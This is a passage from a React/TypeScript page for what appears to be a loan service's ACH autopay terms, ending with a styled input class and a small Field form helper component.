              <ul className="list-disc ml-6 space-y-1.5 text-xs sm:text-sm">
                <li>
                  <strong>Sufficient Funds:</strong> Please ensure your linked account has sufficient funds by the{" "}
                  <strong>4th of each month</strong> to prevent any NSF or failed transaction charges from your bank.
                </li>
                <li>
                  <strong>Pre-Notification:</strong> You will receive an automated email and SMS notification{" "}
                  <strong>3 business days prior</strong> to each scheduled deduction confirming the amount.
                </li>
                <li>
                  <strong>Updating Bank Account:</strong> To modify your linked bank routing or account number, submit
                  an update in your dashboard at least <strong>10 business days prior</strong> to the next deduction date.
                </li>
                <li>
                  <strong>Payment Confirmation:</strong> Each successful deduction will be reflected in your account
                  statement as <em>"VERCELLOANS ACH DEBIT"</em>.
                </li>
              </ul>
            </div>
          </div>
        </div>
      </section>
    </div>
  );
}

/* ── Helpers ──────────────────────────────────────────────────────────── */

const inputCls =
  "w-full rounded-lg border border-input bg-background px-3.5 py-2.5 text-sm focus:outline-none focus:ring-2 focus:ring-ring";

function Field({
  label,
  error,
  children,
}: {
  label: string;
  error?: string;
  children: React.ReactNode;
}) {
  return (
    <div>
      <label className="block text-sm font-medium mb-1.5">{label}</label>
      {children}
      {error && <p className="mt-1 text-xs text-destructive">{error}</p>}
    </div>
  );
}
